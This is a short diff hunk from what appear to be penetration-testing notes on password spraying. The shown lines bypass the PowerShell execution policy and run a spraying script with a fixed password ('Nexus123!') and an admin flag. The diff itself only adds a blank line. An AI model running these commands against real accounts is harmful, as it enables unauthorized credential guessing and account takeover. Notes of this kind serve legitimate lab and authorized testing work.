@@ -10,6 +10,7 @@ using password spraying script
 ```
 powershell -ep bypass
 ```
+
 then execute [[Splay-Passwords.ps1]]
 ```
 .\Splay-Password.ps1 -Pass Nexus123! -Admin
